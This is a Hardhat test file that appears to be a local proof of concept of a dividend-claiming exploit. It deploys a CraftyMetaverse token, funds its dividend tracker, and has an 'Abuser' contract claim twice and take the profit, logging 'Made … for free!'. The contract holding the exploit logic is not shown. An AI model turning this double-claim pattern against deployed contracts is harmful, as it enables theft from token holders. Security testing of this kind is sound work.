import { time } from "@nomicfoundation/hardhat-network-helpers";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber, Signer } from "ethers";
import { formatEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

import { Abuser__factory, CraftyMetaverse, CraftyMetaverseDividendTracker, CraftyMetaverseDividendTracker__factory, CraftyMetaverse__factory, PancakeFactory, PancakeFactory__factory, PancakePair, PancakePair__factory, PancakeRouter, PancakeRouterV2, PancakeRouterV2__factory, PancakeRouter__factory, TcpFactory, TcpFactory__factory, TcpPair, TcpPair__factory, TcpRouter, TcpRouter__factory, TestContract, WBNB, WBNB__factory } from "../typechain-types";
import { Abuser } from "../typechain-types/artifacts/contracts/Abuser.sol/Abuser";
const { parseEther } = ethers.utils;

describe("TCP", () => {
    let owner: SignerWithAddress;
    let alice: SignerWithAddress;
    let bob: SignerWithAddress;
    let craftyContract: CraftyMetaverse;
    let craftyFactory: CraftyMetaverse__factory;
    let dividendContractFactory: CraftyMetaverseDividendTracker__factory;
    let abuser: Abuser;
    let abuserFactory: Abuser__factory;

    beforeEach(async () => {
        [owner, alice, bob] = await ethers.getSigners();
        craftyFactory = await ethers.getContractFactory("CraftyMetaverse");
        dividendContractFactory = await ethers.getContractFactory("CraftyMetaverseDividendTracker");
        abuserFactory = await ethers.getContractFactory("Abuser");
        craftyContract = await craftyFactory.deploy();
        abuser = await (await abuserFactory.connect(alice)).deploy(craftyContract.address);
    });

    describe("Crafty", () => {
        it("Check it", async() => {
            await craftyContract.mintTokens(parseEther("10000000"));
            await craftyContract.openTrade();
            const dividendTrackerAddress = await craftyContract.dividendTracker();
            const dividendTracker = await dividendContractFactory.attach(dividendTrackerAddress);
            
            await craftyContract.transfer(alice.address, parseEther("1000000"));
            await craftyContract.transfer(abuser.address, parseEther("1000000"));
            await owner.sendTransaction({to: dividendTrackerAddress, value: parseEther("10")});

            const aliceBefore = await alice.getBalance();
            await abuser.claimMe();
            await abuser.claimMe();
            await abuser.getProfit();
            const aliceAfter = await alice.getBalance();
            console.log("Made %d for free!", formatEther(aliceAfter.sub(aliceBefore)));
        });
    });
})

// Utilities
const approveTestContract = async(testContract: TestContract, signer: Signer, to: string) => {
    (await (await testContract.connect(signer)).approve(to, ethers.constants.MaxUint256))
}